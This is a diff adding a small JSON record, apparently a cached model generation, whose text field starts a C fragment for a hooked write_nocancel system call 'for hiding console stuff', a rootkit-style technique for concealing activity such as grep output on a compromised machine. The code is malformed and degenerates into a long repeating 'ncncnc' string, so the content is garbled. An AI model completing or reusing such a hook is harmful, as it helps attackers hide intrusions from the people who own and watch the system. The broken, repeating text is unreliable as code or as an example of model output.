@@ -1,0 +1,5 @@
+{
+  "cache_key": "3a00ef38b76b1e5abc07",
+  "provider_request_id": null,
+  "text": "Context: /* hooked write_nocancel for hiding console stuff */ int_write_nocancelstruct proc* p, struct write_nocancel_args *uap, user_ssize_t* retval) {char buffer[MAXBUFFER] if(strncmpp->p_comm, grep, strlenp->p_comm)) strlenp->p_comm)) strlen0strncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncncnc"
+}
